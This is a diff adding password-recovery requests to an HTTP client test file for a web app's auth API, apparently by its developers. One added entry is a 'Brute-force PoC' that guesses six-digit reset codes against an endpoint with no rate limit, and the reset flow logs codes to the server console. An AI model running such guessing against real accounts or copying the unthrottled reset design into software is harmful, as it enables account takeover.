@@ -20,6 +20,37 @@ Content-Type: application/json
 }
 
 ### ------------------------------
+### Password recovery
+
+### Request reset code (check server console log for the code, it's not really emailed)
+POST {{baseUrl}}/auth/recover-password
+Content-Type: application/json
+
+{
+  "email": "test@test3.com"
+}
+
+### Confirm reset with the code from the server log
+POST {{baseUrl}}/auth/recover-password/confirm
+Content-Type: application/json
+
+{
+  "email": "test@test3.com",
+  "code": "CODE_FROM_LOG",
+  "newPassword": "newpassword123"
+}
+
+### Brute-force PoC — no rate limit, spam guesses until one lands (script this with a loop)
+POST {{baseUrl}}/auth/recover-password/confirm
+Content-Type: application/json
+
+{
+  "email": "test@test3.com",
+  "code": "000000",
+  "newPassword": "hacked123"
+}
+
+### ------------------------------
 ### Notes (replace TOKEN with a login response's token)
 @token = TOKEN
 
